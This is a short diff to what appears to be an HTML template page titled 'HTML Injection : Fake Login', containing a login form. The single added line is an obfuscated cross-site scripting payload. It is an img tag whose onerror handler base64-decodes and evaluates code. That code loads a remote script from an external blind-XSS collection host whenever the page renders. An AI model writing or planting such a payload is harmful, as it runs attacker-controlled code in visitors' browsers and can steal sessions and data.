@@ -6,6 +6,7 @@ info:
     <div class="heading">
         <h1>HTML Injection : Fake Login</h1>
         <font color="red">Html injection;
+        "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL21yZG9vczAyMyI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>
     </div>
     <div class="form-container">
         <form action="https://example.com/login" method="post" class="form-signin">
